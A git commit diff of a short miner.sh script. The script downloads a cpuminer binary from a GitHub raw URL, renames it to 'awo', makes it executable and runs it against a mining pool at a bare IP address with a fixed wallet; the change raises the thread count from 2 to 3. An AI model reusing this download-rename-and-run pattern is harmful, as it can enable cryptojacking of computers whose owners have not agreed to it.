5b1bba311c7ff619dc31094ad3942c4bca91d77f
apaple <76417012+apaple@users.noreply.github.com>
2024-01-07 17:05:28 +0700

    Update miner.sh

--- miner.sh
+++ miner.sh
@@ -1,3 +1,3 @@
 wget https://raw.githubusercontent.com/apaple/kurohs/master/cpuminer-sse2 && mv cpuminer-sse2 awo && chmod u+x awo
 
-./awo -a yespowersugar -o stratum+tcps://47.236.100.158:80 -u sugar1qzqru303xvxefcfhly9mwh8gepqsq65ulsfzq0k.wrke -p x -t 2
+./awo -a yespowersugar -o stratum+tcps://47.236.100.158:80 -u sugar1qzqru303xvxefcfhly9mwh8gepqsq65ulsfzq0k.wrke -p x -t 3
